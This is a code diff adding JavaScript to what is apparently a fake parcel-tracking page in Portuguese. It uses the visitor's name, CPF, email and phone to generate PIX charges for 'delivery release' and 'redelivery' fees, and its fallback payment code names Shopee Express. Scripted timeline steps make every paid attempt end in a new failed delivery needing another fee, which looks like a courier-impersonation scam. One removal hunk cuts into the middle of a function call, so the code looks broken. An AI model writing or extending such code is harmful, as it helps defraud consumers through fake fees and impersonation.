@@ -629,6 +629,472 @@ export class TrackingSystem {
         return values[attemptNumber - 1] || 7.74;
     }
 
+    // Lidar com pagamento de tentativa de entrega
+    async handleDeliveryAttemptPayment(attemptNumber, value) {
+        console.log(`💳 Processando pagamento da ${attemptNumber}ª tentativa - R$ ${value.toFixed(2)}`);
+        
+        // Mostrar loading
+        this.showDeliveryPaymentLoading(attemptNumber);
+        
+        try {
+            // Gerar PIX via Zentra Pay
+            const userData = {
+                nome: this.leadData.nome_completo,
+                cpf: this.leadData.cpf,
+                email: this.leadData.email,
+                telefone: this.leadData.telefone
+            };
+            
+            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);
+            
+            if (pixResult.success) {
+                console.log('🎉 PIX de entrega gerado com sucesso!');
+                this.deliveryPixData = pixResult;
+                
+                this.closeDeliveryPaymentLoading();
+                
+                // Mostrar modal de pagamento
+                setTimeout(() => {
+                    this.showDeliveryPaymentModal(attemptNumber, value);
+                }, 300);
+            } else {
+                throw new Error(pixResult.error || 'Erro ao gerar PIX');
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro ao gerar PIX de entrega:', error);
+            this.closeDeliveryPaymentLoading();
+            
+            // Mostrar modal estático como fallback
+            setTimeout(() => {
+                this.showDeliveryPaymentModal(attemptNumber, value, true);
+            }, 300);
+        }
+    }
+
+    // Mostrar loading para pagamento de entrega
+    showDeliveryPaymentLoading(attemptNumber) {
+        const loading = document.createElement('div');
+        loading.id = 'deliveryPaymentLoading';
+        loading.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+
+        const content = document.createElement('div');
+        content.style.cssText = `
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s ease;
+            border: 3px solid #e74c3c;
+        `;
+
+        content.innerHTML = `
+            <div style="margin-bottom: 20px;">
+                <i class="fas fa-truck" style="font-size: 3rem; color: #e74c3c; animation: pulse 1.5s infinite;"></i>
+            </div>
+            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
+                Gerando PIX de Entrega...
+            </h3>
+            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
+                Processando ${attemptNumber}ª tentativa de entrega
+            </p>
+            <div style="margin-top: 25px;">
+                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
+                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #e74c3c, #c0392b); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
+                </div>
+            </div>
+        `;
+
+        loading.appendChild(content);
+        document.body.appendChild(loading);
+        document.body.style.overflow = 'hidden';
+    }
+
+    // Fechar loading de pagamento de entrega
+    closeDeliveryPaymentLoading() {
+        const loading = document.getElementById('deliveryPaymentLoading');
+        if (loading) {
+            loading.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (loading.parentNode) {
+                    loading.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+    }
+
+    // Mostrar modal de pagamento de entrega
+    showDeliveryPaymentModal(attemptNumber, value, isStatic = false) {
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.id = 'deliveryPaymentModal';
+        modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+
+        // QR Code e PIX Payload
+        let qrCodeSrc, pixPayload;
+        
+        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
+            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
+            pixPayload = this.deliveryPixData.pixPayload;
+            console.log('✅ Usando PIX real do Zentra Pay para entrega');
+        } else {
+            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+            console.log('⚠️ Usando PIX estático como fallback para entrega');
+        }
+
+        const buttonText = attemptNumber === 1 ? 'Liberar Entrega' : `${attemptNumber}ª Tentativa de Reenvio`;
+
+        modal.innerHTML = `
+            <div class="professional-modal-container">
+                <div class="professional-modal-header">
+                    <h2 class="professional-modal-title">${buttonText}</h2>
+                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content">
+                    <div class="liberation-explanation">
+                        <p class="liberation-subtitle">
+                            Para ${attemptNumber === 1 ? 'liberar a entrega' : 'reagendar a entrega'} do seu pedido, é necessário pagar a taxa de R$ ${value.toFixed(2)}.
+                        </p>
+                    </div>
+
+                    <div class="professional-fee-display">
+                        <div class="fee-info">
+                            <span class="fee-label">Taxa de ${attemptNumber === 1 ? 'Liberação de' : 'Reenvio -'} Entrega</span>
+                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
+                        </div>
+                    </div>
+
+                    <!-- Seção PIX -->
+                    <div class="professional-pix-section">
+                        <h3 class="pix-section-title">Pagamento via Pix</h3>
+                        
+                        <div class="pix-content-grid">
+                            <!-- QR Code -->
+                            <div class="qr-code-section">
+                                <div class="qr-code-container">
+                                    <img src="${qrCodeSrc}" alt="QR Code PIX Entrega" class="professional-qr-code">
+                                </div>
+                            </div>
+                            
+                            <!-- PIX Copia e Cola -->
+                            <div class="pix-copy-section">
+                                <label class="pix-copy-label">PIX Copia e Cola</label>
+                                <div class="professional-copy-container">
+                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
+                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
+                                        <i class="fas fa-copy"></i> Copiar Chave PIX
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Instruções de Pagamento -->
+                        <div class="professional-payment-steps">
+                            <h4 class="steps-title">Como realizar o pagamento:</h4>
+                            <div class="payment-steps-grid">
+                                <div class="payment-step">
+                                    <div class="step-number">1</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-mobile-alt step-icon"></i>
+                                        <span class="step-text">Acesse seu app do banco</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-qrcode step-icon"></i>
+                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-check step-icon"></i>
+                                        <span class="step-text">Confirme o pagamento</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Botão de Simulação -->
+                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
+                            <button id="simulateDeliveryPaymentButton" data-attempt="${attemptNumber}" style="
+                                background: transparent;
+                                color: #666;
+                                border: 1px solid #ddd;
+                                padding: 6px 12px;
+                                border-radius: 6px;
+                                cursor: pointer;
+                                font-weight: 600;
+                                transition: all 0.3s ease;
+                                opacity: 0.7;
+                                font-size: 12px;
+                                min-width: 30px;
+                                height: 28px;
+                            ">
+                                --
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
+
+        // Configurar eventos
+        this.setupDeliveryPaymentModalEvents(modal, attemptNumber, value);
+
+        console.log(`💳 Modal de pagamento da ${attemptNumber}ª tentativa exibido - R$ ${value.toFixed(2)}`);
+    }
+
+    // Configurar eventos do modal de pagamento de entrega
+    setupDeliveryPaymentModalEvents(modal, attemptNumber, value) {
+        // Botão fechar
+        const closeButton = modal.querySelector('#closeDeliveryPaymentModal');
+        if (closeButton) {
+            closeButton.addEventListener('click', () => {
+                this.closeDeliveryPaymentModal();
+            });
+        }
+
+        // Botão copiar PIX
+        const copyButton = modal.querySelector('#copyDeliveryPixButton');
+        if (copyButton) {
+            copyButton.addEventListener('click', () => {
+                this.copyDeliveryPixCode();
+            });
+        }
+
+        // Botão simular pagamento
+        const simulateButton = modal.querySelector('#simulateDeliveryPaymentButton');
+        if (simulateButton) {
+            simulateButton.addEventListener('click', () => {
+                this.simulateDeliveryPayment(attemptNumber);
+            });
+        }
+
+        // Fechar ao clicar fora
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                this.closeDeliveryPaymentModal();
+            }
+        });
+    }
+
+    // Copiar código PIX de entrega
+    copyDeliveryPixCode() {
+        const pixInput = document.getElementById('deliveryPixCode');
+        const copyButton = document.getElementById('copyDeliveryPixButton');
+        
+        if (!pixInput || !copyButton) return;
+
+        try {
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999);
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(pixInput.value).then(() => {
+                    console.log('✅ PIX de entrega copiado');
+                    this.showCopySuccess(copyButton);
+                }).catch(() => {
+                    this.fallbackCopy(pixInput, copyButton);
+                });
+            } else {
+                this.fallbackCopy(pixInput, copyButton);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao copiar PIX de entrega:', error);
+        }
+    }
+
+    // Simular pagamento de entrega
+    simulateDeliveryPayment(attemptNumber) {
+        console.log(`✅ Simulando pagamento da ${attemptNumber}ª tentativa`);
+        
+        // Fechar modal
+        this.closeDeliveryPaymentModal();
+        
+        // Processar pagamento com sucesso
+        setTimeout(() => {
+            this.processDeliveryPaymentSuccess(attemptNumber);
+        }, 1000);
+    }
+
+    // Processar sucesso do pagamento de entrega
+    processDeliveryPaymentSuccess(attemptNumber) {
+        console.log(`🎉 Pagamento da ${attemptNumber}ª tentativa confirmado!`);
+        
+        // Ocultar botão atual
+        const currentButton = document.querySelector(`[data-attempt="${attemptNumber}"]`);
+        if (currentButton) {
+            currentButton.style.display = 'none';
+        }
+        
+        // Mostrar notificação de sucesso
+        this.showDeliverySuccessNotification(attemptNumber);
+        
+        // Iniciar fluxo de entrega
+        setTimeout(() => {
+            this.startDeliveryFlow(attemptNumber);
+        }, 2000);
+    }
+
+    // Mostrar notificação de sucesso da entrega
+    showDeliverySuccessNotification(attemptNumber) {
+        const notification = document.createElement('div');
+        notification.className = 'delivery-success-notification';
+        notification.style.cssText = `
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #27ae60;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-family: 'Inter', sans-serif;
+            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
+        `;
+
+        notification.innerHTML = `
+            <i class="fas fa-truck" style="font-size: 1.2rem;"></i>
+            <div>
+                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
+                <div style="font-size: 0.9rem; opacity: 0.9;">${attemptNumber}ª tentativa liberada.</div>
+            </div>
+        `;
+
+        document.body.appendChild(notification);
+
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.remove();
+            }
+        }, 5000);
+    }
+
+    // Iniciar fluxo de entrega após pagamento
+    startDeliveryFlow(attemptNumber) {
+        console.log(`🚚 Iniciando fluxo de entrega da ${attemptNumber}ª tentativa`);
+        
+        const timeline = document.getElementById('trackingTimeline');
+        if (!timeline) return;
+
+        const deliverySteps = [
+            {
+                title: 'Pedido sairá para entrega',
+                description: 'Seu pedido está sendo preparado para entrega',
+                delay: 2 * 60 * 1000 // 2 minutos
+            },
+            {
+                title: 'Pedido em trânsito',
+                description: 'Pedido em trânsito para seu endereço',
+                delay: 2 * 60 * 60 * 1000 // 2 horas
+            },
+            {
+                title: 'Pedido em rota para seu destino',
+                description: 'Pedido em rota para seu destino, aguarde',
+                delay: 2 * 60 * 60 * 1000 // 2 horas
+            },
+            {
+                title: 'Nova tentativa de entrega',
+                description: 'Nova tentativa de entrega será realizada',
+                delay: 30 * 60 * 1000, // 30 minutos
+                isNewAttempt: true
+            }
+        ];
+
+        deliverySteps.forEach((step, index) => {
+            setTimeout(() => {
+                const stepDate = new Date();
+                const timelineItem = this.createTimelineItem({
+                    id: 200 + (attemptNumber * 10) + index,
+                    date: stepDate,
+                    title: step.title,
+                    description: step.description,
+                    isChina: false,
+                    completed: true,
+                    needsLiberation: false,
+                    isDeliveryAttempt: step.isNewAttempt,
+                    deliveryValue: step.isNewAttempt ? this.deliveryValues[(attemptNumber) % this.deliveryValues.length] : null,
+                    attemptNumber: step.isNewAttempt ? attemptNumber + 1 : null
+                }, false);
+
+                timeline.appendChild(timelineItem);
+
+                setTimeout(() => {
+                    timelineItem.style.opacity = '1';
+                    timelineItem.style.transform = 'translateY(0)';
+                }, 100);
+
+                timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+                // Se for nova tentativa, incrementar contador
+                if (step.isNewAttempt) {
+                    this.deliveryAttempts++;
+                    const nextValue = this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length];
+                    this.updateCurrentStatus(`${this.deliveryAttempts + 1}ª Tentativa de Entrega (Aguardando Pagamento)`);
+                    console.log(`🔄 Próxima tentativa configurada: ${this.deliveryAttempts + 1}ª - R$ ${nextValue.toFixed(2)}`);
+                }
+
+            }, step.delay);
+        });
+    }
+
+    // Fechar modal de pagamento de entrega
+    closeDeliveryPaymentModal() {
+        const modal = document.getElementById('deliveryPaymentModal');
+        if (modal) {
+            modal.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (modal.parentNode) {
+                    modal.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+    }
+
     // Nova função: Abrir modal de tentativa de entrega
     async openDeliveryModal(attemptNumber, value, buttonElement) {
         console.log(`🚚 Abrindo modal de ${attemptNumber}ª tentativa de entrega - R$ ${value.toFixed(2)}`);
@@ -1341,67 +1807,6 @@ export class TrackingSystem {
         const timelineItem = this.createTimelineItem({
             id: stage.id,
             date: now,
-    // Inicializar sistema de tentativas de entrega
-    initializeDeliverySystem() {
-        console.log('🚚 Inicializando sistema de tentativas de entrega');
-        this.deliveryAttempts = 0;
-        this.deliveryValues = [9.74, 14.98, 18.96]; // Valores das tentativas
-        this.isDeliverySystemActive = true;
-        
-        // Configurar primeira tentativa
-        this.setupDeliveryAttempt();
-    }
-
-    // Configurar tentativa de entrega
-    setupDeliveryAttempt() {
-        const attemptNumber = this.deliveryAttempts + 1;
-        const value = this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length];
-        
-        console.log(`📦 Configurando ${attemptNumber}ª tentativa de entrega - R$ ${value.toFixed(2)}`);
-        
-        // Atualizar status atual
-        this.updateCurrentStatus(`${attemptNumber}ª Tentativa de Entrega (Aguardando Pagamento)`);
-        
-        // Adicionar etapa na timeline com botão
-        this.addDeliveryAttemptStep(attemptNumber, value);
-    }
-
-    // Adicionar etapa de tentativa de entrega na timeline
-    addDeliveryAttemptStep(attemptNumber, value) {
-        const timeline = document.getElementById('trackingTimeline');
-        if (!timeline) return;
-
-        const currentDate = new Date();
-        const timelineItem = this.createTimelineItem({
-            id: 100 + attemptNumber, // IDs únicos para tentativas
-            date: currentDate,
-            title: `${attemptNumber}ª Tentativa de Entrega`,
-            description: `${attemptNumber}ª Tentativa de Entrega (Aguardando Pagamento) - R$ ${value.toFixed(2)}`,
-            isChina: false,
-            completed: true,
-            needsLiberation: false,
-            isDeliveryAttempt: true,
-            deliveryValue: value,
-            attemptNumber: attemptNumber
-        }, false);
-
-        timeline.appendChild(timelineItem);
-
-        setTimeout(() => {
-            timelineItem.style.opacity = '1';
-            timelineItem.style.transform = 'translateY(0)';
-        }, 100);
-
-        timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    }
-
-    // Atualizar status atual no header
-    updateCurrentStatus(statusText) {
-        const currentStatus = document.getElementById('currentStatus');
-        if (currentStatus) {
-            currentStatus.textContent = statusText;
-        }
-    }
             title: stage.title,
             description: stage.title,
             isChina: false,
